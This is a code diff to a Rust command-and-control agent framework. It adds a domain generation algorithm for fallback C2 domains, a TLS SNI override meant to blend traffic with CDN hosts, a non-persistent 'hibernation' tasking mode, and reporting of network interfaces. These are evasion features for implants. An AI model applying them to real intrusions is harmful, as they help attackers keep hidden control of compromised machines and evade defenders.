@@ -8,6 +8,17 @@ use std::collections::HashMap;
 use dashmap::DashMap;
 use ed25519_dalek::SigningKey;
 
+/// A network interface reported by the agent during registration.
+/// Used for topology inference on the server side.
+#[derive(Serialize, Deserialize, Debug, Clone, Default)]
+pub struct NetworkInterface {
+    pub name: String,
+    /// CIDR-notation addresses, e.g. ["192.168.1.5/24", "fe80::1/64"]
+    pub addresses: Vec<String>,
+    /// Human-readable interface flags, e.g. ["UP", "RUNNING"]
+    pub flags: Vec<String>,
+}
+
 #[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
 pub enum TransportProtocol {
     #[serde(rename = "tls")]
@@ -176,6 +187,41 @@ pub struct FallbackConfig {
 
 fn default_dead_time() -> u64 { 300 }
 
+
+fn default_task_batch_size() -> usize { 10 }
+
+// ── DGA configuration ────────────────────────────────────────────────────────
+
+/// Configuration for the Domain Generation Algorithm.
+/// When present in `C2Config.dga`, the agent automatically appends
+/// algorithmically-generated C2 domains to its fallback endpoint list.
+/// Both the agent and operator compute the same domain list from the same
+/// seed, so the operator knows which domains to register before each window.
+#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
+pub struct DgaConfig {
+    /// Per-campaign secret embedded at build time.
+    pub seed: u64,
+    /// How many seconds each domain set is valid. Default: 86400 (1 day).
+    #[serde(default = "default_dga_window")]
+    pub window_secs: u64,
+    /// Number of domains to generate per window.
+    #[serde(default = "default_dga_count")]
+    pub count: u32,
+    /// TLDs to sample from, e.g. ["com", "net", "org"].
+    #[serde(default = "default_dga_tlds")]
+    pub tlds: Vec<String>,
+    /// Max consecutive failures before a DGA-generated domain is marked dead.
+    #[serde(default = "default_dga_max_failures")]
+    pub max_failures_per_domain: u32,
+}
+
+fn default_dga_window()       -> u64         { 86400 }
+fn default_dga_count()        -> u32         { 16 }
+fn default_dga_tlds()         -> Vec<String> { vec!["com".into(), "net".into(), "org".into()] }
+fn default_dga_max_failures() -> u32         { 3 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct C2Config {
     #[serde(default)]
@@ -211,6 +257,26 @@ pub struct C2Config {
     /// Agent proves knowledge of this key via HMAC during session setup.
     #[serde(default)]
     pub challenge_key: String,
+    /// SNI hostname to advertise in the TLS ClientHello, overriding c2_host.
+    /// The actual TCP connection still goes to c2_host:tunnel_port.
+    /// Set to a CDN or cloud hostname to blend with normal TLS traffic.
+    #[serde(default)]
+    pub sni_override: Option<String>,
+    /// ALPN protocols to advertise in the TLS ClientHello.
+    /// Safe default: ["http/1.1"]. Do not advertise "h2" unless you speak HTTP/2.
+    #[serde(default)]
+    pub alpn_protocols: Vec<String>,
+    /// When true the agent operates in hibernation mode: connect, claim a
+    /// batch of queued tasks, execute, disconnect, sleep — never persists.
+    #[serde(default)]
+    pub hibernation_mode: bool,
+    /// Maximum tasks claimed per hibernation check-in. Default 10.
+    #[serde(default = "default_task_batch_size")]
+    pub task_batch_size: usize,
+    /// Optional Domain Generation Algorithm config. When set, the agent generates
+    /// additional C2 hostnames each window as low-priority fallback endpoints.
+    #[serde(default)]
+    pub dga: Option<DgaConfig>,
 }
 
 // ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
@@ -229,6 +295,15 @@ pub struct ClientHello {
     /// ISO-8601 registration timestamp included in the HMAC to prevent replays.
     #[serde(default)]
     pub reg_timestamp: String,
+    /// Network interfaces reported for topology inference.
+    #[serde(default)]
+    pub interfaces: Vec<NetworkInterface>,
+    /// Agent is operating in hibernation mode (connect → tasks → disconnect → sleep).
+    #[serde(default)]
+    pub hibernation_mode: bool,
+    /// Maximum tasks to claim per hibernation check-in.
+    #[serde(default = "default_task_batch_size")]
+    pub task_batch_size: usize,
 }
 
 /// Server sends this after receiving ClientHello to prove it holds the
@@ -299,6 +374,10 @@ pub struct Session {
     pub signing_key: SigningKey,
     pub parent_id: Option<u32>,
     pub last_seen: Arc<std::sync::atomic::AtomicI64>,
+    /// Network interfaces as reported at registration.
+    pub interfaces: Vec<NetworkInterface>,
+    /// Whether this session is a hibernating agent.
+    pub hibernation_mode: bool,
 }
 
 impl Session {
@@ -433,6 +512,8 @@ mod tests {
             signing_key: ed25519_dalek::SigningKey::from_bytes(&[0u8; 32]),
             parent_id: None,
             last_seen: std::sync::Arc::new(std::sync::atomic::AtomicI64::new(chrono::Utc::now().timestamp())),
+            interfaces: vec![],
+            hibernation_mode: false,
         };
         assert!(session.seconds_since_seen() < 2);
         session.touch();
